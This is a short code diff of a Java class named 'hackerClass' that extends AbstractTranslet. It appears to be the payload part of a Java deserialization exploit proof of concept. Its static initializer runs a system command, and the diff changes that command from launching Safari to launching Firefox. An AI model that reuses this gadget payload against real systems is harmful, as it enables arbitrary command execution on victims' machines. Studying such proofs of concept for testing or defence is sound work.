@@ -16,7 +16,8 @@ public class hackerClass extends AbstractTranslet {
 
     static {
         try {
-            Runtime.getRuntime().exec("/System/Volumes/Preboot/Cryptexes/App/System/Applications/Safari.app/Contents/MacOS/Safari");
+            // Runtime.getRuntime().exec("/System/Volumes/Preboot/Cryptexes/App/System/Applications/Safari.app/Contents/MacOS/Safari");
+            Runtime.getRuntime().exec("firefox");
         } catch (IOException e) {
             throw new RuntimeException(e);
         }
